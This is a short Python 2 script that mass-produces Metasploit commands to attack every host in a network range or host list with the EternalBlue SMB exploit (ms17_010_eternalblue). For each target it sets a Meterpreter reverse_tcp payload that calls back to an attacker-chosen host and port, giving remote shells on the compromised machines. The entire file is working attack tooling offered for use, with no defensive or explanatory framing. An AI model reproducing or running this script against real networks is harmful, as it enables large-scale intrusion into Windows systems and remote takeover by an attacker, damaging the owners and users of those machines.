#!/usr/bin/env python
# Author Dario Clavijo 2018
import sys
import ipaddress
import pyping

no_ping = True

exploit = 'exploit/windows/smb/ms17_010_eternalblue'
meterpreter = 'windows/meterpreter/reverse_tcp'

payload="""use %s 
set RHOST %s
set LHOST %s
set LPORT %s
set PAYLOAD %s
exploit"""

if len(sys.argv) == 1:
    print "usage:",sys.argv[0],"[OPT] [ARG]"
    print "\t-n [network/mask] [LHOST:LPORT]"
    print "\t-f [hostfile] [LHOST:LPORT]"
    exit(0)

opt = sys.argv[1]
lhost=sys.argv[3].split(":")
local_host  = lhost[0]
local_port = lhost[1]

if opt == "-n":
    remote_hosts = list(ipaddress.IPv4Network(unicode(sys.argv[2]),strict=False).hosts())

if opt == "-f":
    remote_hosts = []
    fp = open(sys.argv[2],'r')
    for line in fp:
        if line.find("#") == -1:
            remote_hosts.append(line.strip())

for remote_host in remote_hosts:
    if no_ping:
        print payload % (exploit,remote_host,local_host,local_port,meterpreter)
    else:
        if pyping.ping(str(remote_host)):
            print payload % (exploit,remote_host,local_host,local_port,meterpreter)
print "exit"
            
